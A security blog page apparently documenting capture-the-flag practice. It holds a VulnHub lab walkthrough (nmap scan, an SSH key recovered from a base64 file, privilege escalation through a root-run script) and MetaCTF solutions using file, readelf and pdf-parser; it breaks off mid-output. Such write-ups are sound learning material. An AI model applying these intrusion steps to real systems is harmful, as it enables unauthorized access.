<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/4/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-oscp_voucher" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/oscp_voucher/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.088Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/oscp_voucher/">
        OSCP Voucher
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a></p>
<p><a target="_blank" rel="noopener" href="https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025">InfoSec Prep: OSCP VulnhubWalkthrough</a></p>
<hr>
<p>機器開啟後</p>
<p><img src="img/oscpvou_Untitled.png" alt="Untitled"></p>
<p>用另一台kali的nmap</p>
<p><code>nmap -sV -A -v 192.168.32.128</code></p>
<p><img src="img/oscpvou_Untitled_1.png" alt="Untitled"></p>
<p>可以看到一些重要資訊</p>
<ul>
<li>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</li>
<li><p>80/tcp open http Apache httpd 2.4.41 ((Ubuntu))</p>
<ul>
<li><p>主頁面可以看到oscp是該機器的用戶</p>
<p><img src="img/oscpvou_Untitled_2.png" alt="Untitled"></p>
</li>
<li><p>/secret.txt</p>
<p><img src="img/oscpvou_Untitled_3.png" alt="Untitled"></p>
<p>注意到這檔案，是base64加密過的</p>
<p><img src="img/oscpvou_Untitled_4.png" alt="Untitled"></p>
<p>這看起來像是id_rsa的文件內容</p>
<p><code>cat secret.txt| base64 -d &gt; id_rsa</code></p>
<p>用這個登入ssh</p>
<p><code>ssh oscp@192.168.32.128 -i id_rsa</code></p>
<p><img src="img/oscpvou_Untitled_5.png" alt="Untitled"></p>
<p>接下來查看/bin/bash的權限並直接切換用戶到root</p>
<p><img src="img/oscpvou_Untitled_6.png" alt="Untitled"></p>
<p>我們在oscp的用戶下有個檔案</p>
<p><img src="img/oscpvou_Untitled_7.png" alt="Untitled"></p>
<p>當查看/etc/systemd/system/ip-update.service</p>
<p><img src="img/oscp_vouUntitled_8.png" alt="Untitled"></p>
<p>由於不存在用戶信息，我們知道該<code>ip</code>腳本是以 root 身份運行的。由於該腳本位於 oscp 用戶目錄中，我們可以重命名當前腳本並創建我們自己的腳本，該腳本將以 root 身份運行。</p>
</li>
</ul>
</li>
</ul>
<p>在前面WordPress網頁中，有說到flag在/root/中，列出目錄下所有文件，並重命名一個IP文件</p>
<p><img src="img/oscpvou_Untitled_9.png" alt="Untitled"></p>
<p><img src="img/oscpvou_Untitled_10.png" alt="Untitled"></p>
<p>然後需要先改viminfo檔權限才可以用vim編輯ip檔案</p>
<p><img src="img/oscpvou_Untitled_11.png" alt="Untitled"></p>
<p>OSCP的機器重開機，再去ls.txt內容會看到flag</p>
<p><img src="img/oscpvou_Untitled_12.png" alt="Untitled"></p>
<p>現在知道文件名稱了再改一下腳本，並重啟VM，到oscp的用戶下就會看到flag</p>
<p><img src="img/oscpvou_Untitled_13.png" alt="Untitled"></p>
<p><img src="img/oscpvou_Untitled_14.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-metactf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/metactf/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.087Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/metactf/">
        METACTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Take a look at ConnectWind’s internal employee portal. In addition to company policies &amp; HR information, I heard it also stores flags.</p>
<p>Can you access the protected employee portal without knowing the password and steal the flag?</p>
<p><img src="img/metactfimage.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://metaproblems.com/71c5b42eb77639d5224be5589123de30/employee_portal.php</span><br></pre></td></tr></table></figure>
<p><img src="img/metactfimage1.png" alt="image.png"></p>
<hr>
<p>We recovered this executable from a device, but we can’t figure out how to make the program run. We suspect the code was compiled for a system with a different CPU architecture.</p>
<p>Can you figure out which architecture it was compiled for? The flag is the name of the architecture. You don’t need to run or take apart the executable.</p>
<p>The flag is not in MetaCTF{} format, it’s just the name of the architecture. You only have 10 attempts on this challenge.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#file astronaut </span></span><br><span class="line">astronaut: ELF 32-bit LSB executable, Tensilica Xtensa, version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#readelf -h  astronaut </span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Tensilica Xtensa Processor</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x400d3128</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          1007004 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         6</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         33</span></span><br><span class="line"><span class="string">  Section header string table index: 32</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Tensilica Xtensa</p>
</blockquote>
<hr>
<p>Your anonymous music producer friend (D34DM0053) is getting ready to publish an open letter on mental health in the music industry, but they don’t know much about computers. Can you help double check their letter to make sure it isn’t leaking their identity?</p>
<p><a target="_blank" rel="noopener" href="https://metaproblems.com/0778e85952c806a4f55fb61d12fd8ca0/D34DM0053_Open_Letter_Mental_Health.pdf">Here’s the letter in question.</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf </span></span><br><span class="line">This program has not been tested with this version of Python (3.11.2)</span><br><span class="line">Should you encounter problems, please use Python version 3.11.1</span><br><span class="line">PDF Comment <span class="string">'%PDF-1.4\n'</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">'%\xc3\xa4\xc3\xbc\xc3\xb6\xc3\x9f\n'</span></span><br><span class="line"></span><br><span class="line">obj 2 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 3 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 3 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 3 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 4 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 5 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Filter /DCTDecode</span><br><span class="line">    /Length 68385</span><br><span class="line">    /SMask 5 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 5 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 6 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /Length 6 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Decode [ 1 0 ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 6 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 8 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 9 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 9 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 19844</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 9 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 10 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 8 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1066 -385 1998 1121]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1120</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 8 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 11 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 247</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 12 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 10 0 R, 11 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 6</span><br><span class="line">    /Widths [600 830 695 695 995 695 695 ]</span><br><span class="line">    /FontDescriptor 10 0 R</span><br><span class="line">    /ToUnicode 11 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 13 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 14 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 14 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 22720</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 14 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 15 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 13 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1015 -350 1659 1068]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1067</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 13 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 16 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 304</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 17 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 15 0 R, 16 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 18</span><br><span class="line">    /Widths <span class="string">'[600 974 612 591 634 615 317 591 633 611 633 317 411 634 277 634\n392 633 520 ]'</span></span><br><span class="line">    /FontDescriptor 15 0 R</span><br><span class="line">    /ToUnicode 16 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 18 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 19 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 19 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 27680</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 19 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 20 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 18 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /CAAAAA+DejaVuSans</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1020 -462 1793 1233]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1232</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 18 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 21 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 458</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 22 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 20 0 R, 21 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /CAAAAA+DejaVuSans</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 53</span><br><span class="line">    /Widths <span class="string">'[600 751 615 591 317 591 411 611 633 317 294 317 974 392 612 579\n277 634 634 520 634 634 549 352 633 633 277 1000 317 591 774 817\n277 631 988 360 684 686 770 636 636 336 636 610 862 694 524 336\n294 500 557 634 634 603 ]'</span></span><br><span class="line">    /FontDescriptor 20 0 R</span><br><span class="line">    /ToUnicode 21 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 23 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 24 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 24 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 24704</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 24 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 25 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 23 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1069 -415 1975 1175]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1174</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 23 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 26 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 379</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 27 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 25 0 R, 26 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 35</span><br><span class="line">    /Widths <span class="string">'[600 850 715 678 711 348 637 478 493 715 651 830 695 695 995 695\n695 399 773 715 595 342 715 674 342 836 711 711 592 372 682 665\n732 687 435 379 ]'</span></span><br><span class="line">    /FontDescriptor 25 0 R</span><br><span class="line">    /ToUnicode 26 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 28 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 27 0 R, 22 0 R, 17 0 R, 12 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /F1 27 0 R</span><br><span class="line">    /F2 22 0 R</span><br><span class="line">    /F3 17 0 R</span><br><span class="line">    /F4 12 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 29 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 28 0 R, 4 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Font 28 0 R</span><br><span class="line">    /XObject</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /Im4 4 0 R</span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /ProcSet [/PDF/Text/ImageC/ImageI/ImageB]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 1 0</span><br><span class="line"> Type: /Page</span><br><span class="line"> Referencing: 7 0 R, 29 0 R, 2 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent 7 0 R</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [0 0 612 792]</span><br><span class="line">    /Group</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /S /Transparency</span><br><span class="line">        /CS /DeviceRGB</span><br><span class="line">        /I <span class="literal">true</span></span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /Contents 2 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 30 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 31 0 R, 31 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 1</span><br><span class="line">    /First 31 0 R</span><br><span class="line">    /Last 31 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 31 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 0</span><br><span class="line">    /Title &lt;FEFF004F00700065006E0020004C0065007400740065007200200062007900200044003300340044004D0030003000350033003A002000410064006400720065007300730069006E00670020004D0065006E00740061006C0020004800650061006C0074006800200069006E00200074006800650020004D007500730069006300200049006E006400750073007400720079&gt;</span><br><span class="line">    /Dest [1 0 R/XYZ 57.8 723.3 0]</span><br><span class="line">    /Parent 30 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 7 0</span><br><span class="line"> Type: /Pages</span><br><span class="line"> Referencing: 29 0 R, 1 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [ 0 0 612 792 ]</span><br><span class="line">    /Kids [ 1 0 R ]</span><br><span class="line">    /Count 1</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [1 0 R /XYZ null null 0]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author &lt;FEFF005700720065006E0020004700610069006C006C006100720064&gt;</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">"(D:20240611094236-07'00')"</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 34</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 123882</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">'%%EOF\n'</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">'%BeginExifToolUpdate\n'</span></span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R, 34 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [ 1 0 R /XYZ null null 0 ]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author (MetaCTF{Wren_Gaillard})</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">"(D:20240611094236-07'00')"</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 34 0</span><br><span class="line"> Type: /Metadata</span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Metadata</span><br><span class="line">    /Subtype /XML</span><br><span class="line">    /Length 2802</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">'%EndExifToolUpdate 124767\n'</span></span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 35</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6b32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">    /Prev 123882</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 128031</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">'%%EOF\n'</span></span><br><span class="line"></span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf | grep Meta</span></span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">    /Author 